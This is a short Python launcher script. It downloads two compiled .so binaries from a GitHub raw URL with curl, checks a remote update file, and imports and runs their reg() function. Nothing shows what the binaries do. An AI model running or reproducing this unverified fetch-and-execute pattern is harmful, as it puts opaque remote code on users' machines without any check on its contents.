#coding=utf-8
import os, sys, platform
try:
    import requests
except:
    os.system('pip2 install requests')

import requests
if not os.path.isfile('Jutt.so'):
    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKER/JuttBadshah/main/Jutt.so > Jutt.so')
    os.system('clear')
if not os.path.isfile('brand.so'):
    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKER/JuttBadshah/main/brand.so > brand.so')
    os.system('clear')
bit=platform.architecture()[0]
go = requests.get('https://raw.githubusercontent.com/SHOOTER-MAKER/JuttBadshah/main/update.txt').text
if 'Juttbrand' in go:
    if bit == '64bit':
        from Jutt import reg
        reg()
    elif bit == '32bit':
        from brand import reg
        reg()
else:
    os.system('rm -rf Jutt.so brand.so')
    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKER/JuttBadshah/main/Jutt.so > Jutt.so')
    os.system('curl -L https://raw.githubusercontent.com/SHOOTER-MAKER/JuttBadshah/main/brand.so > brand.so')
    if bit == '64bit':
        from Jutt import reg
        reg()
    elif bit == '32bit':
        from brand import reg
        reg()
